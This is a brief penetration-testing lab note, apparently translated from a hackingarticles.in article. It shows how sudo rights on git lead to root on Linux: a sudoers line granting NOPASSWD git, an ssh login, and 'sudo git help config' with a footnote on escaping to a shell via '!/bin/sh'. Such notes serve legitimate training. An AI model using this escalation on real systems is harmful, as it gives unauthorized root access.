## git Privilege Escalation

`git --help`

`git log`

### Sudo Rights Lab setups for Privilege Escalation

`test ALL=(root) NOPASSWD: /usr/bin/git` [^1]

### Exploiting Sudo rights

`ssh test@192.168.0.15`

`sudo git help config`[^2]



[原文](https://www.hackingarticles.in/linux-for-pentester-git-privilege-escalation/)

---

[^1]: 在 sudoers 文件里添加 test 账户
[^2]: 注入 `!/bin/sh` 来执行 bash shell